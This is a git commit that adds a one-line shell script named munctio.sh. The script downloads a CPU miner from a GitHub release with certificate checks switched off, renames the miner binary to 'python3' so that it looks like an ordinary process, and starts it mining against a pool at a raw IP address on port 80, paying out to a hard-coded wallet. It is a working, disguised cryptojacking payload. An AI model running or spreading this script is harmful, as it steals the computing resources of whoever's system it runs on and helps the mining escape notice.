c2b2f46c1ac104e740b3d6669338797e4298715d
babijuki1 <129475146+babijuki1@users.noreply.github.com>
2023-03-31 03:30:56 +0000

    Create munctio.sh

---
+++ munctio.sh
@@ -0,0 +1,1 @@
+wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 python3 && ./python3 -a yescryptr16  -o stratum+tcp://170.64.152.165:80 -u web1qgflufj7wvftw23gs7gyzh4wt3f3npnlf332lae.Danis
